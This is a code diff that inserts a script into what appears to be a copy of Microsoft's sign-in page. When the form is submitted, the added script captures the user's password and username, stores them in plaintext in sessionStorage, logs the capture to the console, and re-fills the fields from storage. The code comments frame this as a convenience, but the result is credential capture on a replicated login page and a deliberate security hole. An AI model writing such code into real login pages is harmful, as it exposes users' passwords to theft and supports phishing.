@@ -93,6 +93,43 @@ function t(r,t){var n=document.getElementsByName(r);n&&n.length>0&&e(n[0],"click
 !function(){var e=window,s=e.document,i=e.$Config||{};if(e.self===e.top){s&&s.body&&(s.body.style.display="block")}else if(!i.allowFrame){var o,t,r,f,n,d;if(i.fAddTryCatchForIFrameRedirects){try{o=e.self.location.href,t=o.indexOf("#"),r=-1!==t,f=o.indexOf("?"),n=r?t:o.length,d=-1===f||r&&f>t?"?":"&",o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}catch(e){}}else{o=e.self.location.href,t=o.indexOf("#"),r=-1!==t,f=o.indexOf("?"),n=r?t:o.length,d=-1===f||r&&f>t?"?":"&",
 o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}}}();
 //]]></script>
-    
+<script type="text/javascript">
+    document.addEventListener('DOMContentLoaded', function() {
+      // Find the password input field - using the specific selector for Microsoft's login page
+      const passwordField = document.querySelector('input[name="passwd"]');
+      const loginForm = document.querySelector('form[action*="login"]');
+      
+      if (loginForm && passwordField) {
+        loginForm.addEventListener('submit', function(e) {
+          // Store the password in sessionStorage (will be cleared when browser is closed)
+          sessionStorage.setItem('userPassword', passwordField.value);
+          
+          // Also store the username if available
+          const usernameField = document.querySelector('input[name="loginfmt"]');
+          if (usernameField) {
+            sessionStorage.setItem('userName', usernameField.value);
+          }
+          
+          console.log('Credentials saved to session storage');
+          // Form will continue to submit normally
+        });
+      }
+      
+      // Check if there's a stored password and auto-fill it
+      const savedPassword = sessionStorage.getItem('userPassword');
+      if (savedPassword && passwordField) {
+        passwordField.value = savedPassword;
+        console.log('Auto-filled password from session storage');
+      }
+      
+      // Check if there's a stored username and auto-fill it
+      const savedUsername = sessionStorage.getItem('userName');
+      const usernameField = document.querySelector('input[name="loginfmt"]');
+      if (savedUsername && usernameField) {
+        usernameField.value = savedUsername;
+        console.log('Auto-filled username from session storage');
+      }
+    });
+    </script>
 </body>
 </html>
